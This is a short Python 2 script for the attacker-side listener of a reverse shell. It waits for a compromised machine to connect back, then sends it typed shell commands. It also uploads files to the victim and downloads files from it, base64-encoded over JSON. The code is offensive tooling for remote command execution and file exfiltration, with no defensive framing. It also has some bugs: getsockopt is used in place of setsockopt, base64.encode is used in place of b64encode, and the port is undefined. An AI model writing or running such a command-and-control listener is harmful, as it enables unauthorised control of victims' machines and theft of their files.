import base64
import json
import socket
class SocketListener:
    def __init__(self,ip,port):
        connection =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.getsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        connection.bind((ip,port))
        connection.listen(0)
        (self.connect,adress) = connection.accept()
        print("Connected.")
    def json_send(self,command):
        temp = json.dumps(command)
        self.connect.send(temp)
    def json_rec(self):
        log = ""
        while 1==1:
            try:
                log = log + self.connect.recv(1024)
                return json.loads(log)
            except ValueError:
                continue
    def bind(self,input):
        self.json_send(input)
        if input[0] == "exit":
            self.connect.close()
            exit()
        return self.json_rec()

    def save(self,path,direct):
        with open(path,"wb") as p:
            p.write(base64.b64decode(direct))
            return "Downloaded."

    def get(self,path):
        with open(path,"rb") as p:
            return base64.encode(p.read())



    def body(self):
        while 1==1:
            input = raw_input("enter command: ")
            input = input.split(" ")
            try:
                if input[0] == "upload":
                    temp = self.get(input[1])
                    input.append(temp)

                output = self.bind(input)

                if input[0] == "download":
                    output = self.save(input[1],output)


            except Exception:
                output = "Warning!"
            print(output)

instance = SocketListener("enter ip adress",port)#enter local ip adress and port
instance.body()